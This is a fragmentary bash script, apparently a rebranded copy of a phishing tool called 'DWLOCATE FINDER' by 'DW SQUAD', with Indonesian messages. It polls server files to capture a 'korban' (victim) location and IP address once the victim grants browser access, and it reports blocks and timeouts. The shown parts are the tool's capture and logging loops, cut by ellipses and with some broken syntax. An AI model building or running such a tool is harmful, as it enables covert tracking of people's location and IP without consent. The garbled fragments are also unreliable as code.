#!/bin/bash
# DWLOCATE FINDER V.01
# Coded by: DW SQUAD OFFICAL
# Github: https://github.com/thelinuxchoice/DWLOCATEFINDER
...
getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] tunggu korban mengizinkan akses\e[0m\n"
while [ true ]; do


if [[ -e "server/geolocate.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m DAPAT CUYYYY!\n"
catch_cred

fi
sleep 0.5
if [[ -e "server/error.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m WAH KURANG BERUNTUNG!\n"
checkerror=$(grep -o 'Error:.*' server/error.txt | cut -d " " -f2 | tr -d ' ' )
if [[ $checkerror == 1 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] KORBAN MEMBLOKIR AKSES ...\e[0m\n"
...
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] WAKTU HABIS\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 4 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] EROR TIDAK DIKETAHUI\e[0m\n"

rm -rf server/error.txt
getcredentials
else
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Eror membaca file error.txt...\e[0m\n"
exit 1
fi
fi
sleep 0.5
...
catch_ip() {
touch server/saved.dwlocate.txt
...
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] T\e[0m\n"
while [ true ]; do


if [[ -e "server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP KETEMU!\n"
catch_ip
...
figlet"DW SQUAD SECURITY"
printf "\e[1;93m :::\e[0m\e[1;77m DW SQUAD[0m\n"
